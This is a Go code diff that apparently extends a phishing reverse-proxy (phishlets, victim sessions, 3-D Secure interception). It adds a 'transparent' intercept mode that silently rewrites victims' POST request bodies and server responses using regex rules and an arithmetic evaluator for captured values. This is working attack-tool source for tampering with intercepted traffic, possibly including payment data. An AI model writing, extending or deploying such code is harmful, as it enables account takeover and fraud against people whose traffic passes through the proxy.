@@ -1273,6 +1273,39 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							if ic.method != "" && !strings.EqualFold(ic.method, req.Method) {
 								continue
 							}
+							if ic.body_match != nil || len(ic.alterRequest) > 0 {
+								if req.Method != http.MethodPost {
+									continue
+								}
+								body, err := io.ReadAll(req.Body)
+								if err != nil {
+									continue
+								}
+								if ic.body_match != nil && !ic.body_match.Match(body) {
+									req.Body = io.NopCloser(bytes.NewBuffer(body))
+									continue
+								}
+								if len(ic.alterRequest) > 0 {
+									bodyStr := string(body)
+									for _, rule := range ic.alterRequest {
+										if rule.expr != "" {
+											bodyStr = rule.re.ReplaceAllStringFunc(bodyStr, func(match string) string {
+												submatches := rule.re.FindStringSubmatch(match)
+												result := evaluateExpr(rule.expr, submatches)
+												if result != "" {
+													return result
+												}
+												return match
+											})
+										} else {
+											bodyStr = rule.re.ReplaceAllString(bodyStr, rule.replace)
+										}
+									}
+									body = []byte(bodyStr)
+								}
+								req.Body = io.NopCloser(bytes.NewBuffer(body))
+								req.ContentLength = int64(len(body))
+							}
 							switch ic.type_ {
 							case "3ds":
 								if ic.template == "" {
@@ -1285,6 +1318,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								return req, nil
 							case "static", "":
 								return p.interceptRequest(req, ic.http_status, ic.body, ic.mime)
+							case "transparent":
+								log.Debug("intercept: transparent mode - forwarding request (domain=%s, path=%s)", ic.domain, ic.path.String())
 							default:
 								log.Warning("intercept: unknown type '%s', falling back to static (domain=%s, path=%s)", ic.type_, ic.domain, ic.path.String())
 								return p.interceptRequest(req, ic.http_status, ic.body, ic.mime)
@@ -1617,6 +1652,46 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			mime := strings.Split(resp.Header.Get("Content-type"), ";")[0]
 			if err == nil {
+				if pl != nil && ps.SessionId != "" {
+					for _, ic := range pl.intercept {
+						full_path := resp.Request.URL.Path
+						if resp.Request.URL.RawQuery != "" {
+							full_path = resp.Request.URL.Path + "?" + resp.Request.URL.RawQuery
+						}
+						if ic.domain == req_hostname && ic.path.MatchString(full_path) {
+							if ic.method != "" && !strings.EqualFold(ic.method, resp.Request.Method) {
+								continue
+							}
+							if ic.type_ != "transparent" {
+								continue
+							}
+							if ic.responseMatch != nil || len(ic.alterResponse) > 0 {
+								if ic.responseMatch != nil && !ic.responseMatch.Match(body) {
+									continue
+								}
+								if len(ic.alterResponse) > 0 {
+									bodyStr := string(body)
+									for _, rule := range ic.alterResponse {
+										if rule.expr != "" {
+											bodyStr = rule.re.ReplaceAllStringFunc(bodyStr, func(match string) string {
+												submatches := rule.re.FindStringSubmatch(match)
+												result := evaluateExpr(rule.expr, submatches)
+												if result != "" {
+													return result
+												}
+												return match
+											})
+										} else {
+											bodyStr = rule.re.ReplaceAllString(bodyStr, rule.replace)
+										}
+									}
+									body = []byte(bodyStr)
+								}
+							}
+						}
+					}
+				}
+
 				for site, pl := range p.cfg.phishlets {
 					if p.cfg.IsSiteEnabled(site) {
 						// handle sub_filters — collect matching filter sets, supporting
@@ -3306,4 +3381,74 @@ func (p *HttpProxy) handle3DSRequest(req *http.Request) (*http.Request, *http.Re
 		resp := goproxy.NewResponse(req, "application/json", http.StatusNotFound, `{"error":"unknown 3ds endpoint"}`)
 		return req, resp
 	}
+}
+
+func evaluateExpr(expr string, args []string) string {
+	for i, arg := range args {
+		if i == 0 {
+			continue
+		}
+		expr = strings.Replace(expr, "$"+strconv.Itoa(i), arg, -1)
+	}
+	var result float64
+	var current float64
+	var op byte
+	var num []byte
+	for i := 0; i < len(expr); i++ {
+		c := expr[i]
+		if c >= '0' && c <= '9' || c == '.' {
+			num = append(num, c)
+			continue
+		}
+		if len(num) > 0 {
+			val, err := strconv.ParseFloat(string(num), 64)
+			if err != nil {
+				return ""
+			}
+			if op == 0 {
+				current = val
+			} else {
+				switch op {
+				case '+':
+					current += val
+				case '-':
+					current -= val
+				case '*':
+					current *= val
+				case '/':
+					if val != 0 {
+						current /= val
+					}
+				}
+			}
+			num = num[:0]
+		}
+		if c == '+' || c == '-' || c == '*' || c == '/' {
+			op = c
+		}
+	}
+	if len(num) > 0 {
+		val, err := strconv.ParseFloat(string(num), 64)
+		if err != nil {
+			return ""
+		}
+		if op == 0 {
+			current = val
+		} else {
+			switch op {
+			case '+':
+				current += val
+			case '-':
+				current -= val
+			case '*':
+				current *= val
+			case '/':
+				if val != 0 {
+					current /= val
+				}
+			}
+		}
+	}
+	result = current
+	return strconv.FormatFloat(result, 'f', 1, 64)
 }
